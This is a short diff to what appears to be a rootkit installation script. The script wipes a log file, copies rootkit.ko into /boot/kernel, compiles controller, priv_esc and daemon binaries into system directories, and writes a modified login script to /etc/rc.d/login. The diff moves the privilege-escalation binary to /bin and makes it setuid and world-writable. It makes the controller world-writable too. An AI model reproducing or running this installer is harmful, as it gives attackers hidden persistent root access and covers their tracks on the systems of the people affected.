@@ -6,8 +6,10 @@ echo "" > /log.txt
 chmod 666 /log.txt
 cp rootkit.ko /boot/kernel
 cc controller.c -o /sbin/controller
-cc priv_esc.c -o /sbin/priv_esc
-chmod +s /sbin/priv_esc
+chmod 777 /sbin/controller
+cc priv_esc.c -o /bin/priv_esc
+chmod 777 /bin/priv_esc
+chmod +s /bin/priv_esc
 cc daemon.c -o /sbin/daemon
 sed "s/yeet/$1/" login_tmp > /etc/rc.d/login
 chmod 777 /etc/rc.d/login
